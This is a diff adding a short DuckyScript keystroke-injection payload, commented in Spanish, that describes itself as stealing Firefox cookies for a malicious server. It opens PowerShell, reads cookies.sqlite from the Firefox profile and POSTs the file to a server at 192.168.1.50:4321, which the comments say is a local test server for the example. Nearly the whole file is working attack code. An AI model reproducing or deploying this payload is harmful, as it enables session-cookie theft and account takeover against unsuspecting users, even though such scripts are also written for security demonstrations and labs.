@@ -1,0 +1,40 @@
+REM  Este payload roba las cookies de firefox y las transfiere
+REM  a un servidor malicioso conocido. Para este ejemplo
+REM  se programó un pequeño servidor web corriendo
+REM  en la red local.
+
+REM Abre una powerShell
+GUI r
+DELAY 200
+STRING powershell
+DELAY 90
+ENTER
+DELAY 1000
+
+
+REM Se dirige donde firefox tiene las cookies
+STRING cd $env:APPDATA/Mozilla/Firefox/Profiles/*.default-release
+DELAY 80
+ENTER
+DELAY 170
+
+
+REM                       Envía las cookies al servidor malicioso
+REM 
+REM Paso 1: Creamos una variable donde almacenamos el contenido de las cookies
+STRING $file = [System.IO.File]::ReadAllBytes((Join-Path (Get-Location) 'cookies.sqlite'))
+DELAY 80
+ENTER
+DELAY 170
+
+REM Paso 2: Guarda la URL en una variable
+STRING $url = "http://192.168.1.50:4321/cookies"
+DELAY 80
+ENTER
+DELAY 170
+
+REM Paso 3: Envía la cookie al servidor malicioso
+STRING Invoke-RestMethod -Uri $url -Method POST -Body $file -ContentType "application/octet-stream"
+DELAY 80
+ENTER
+DELAY 170
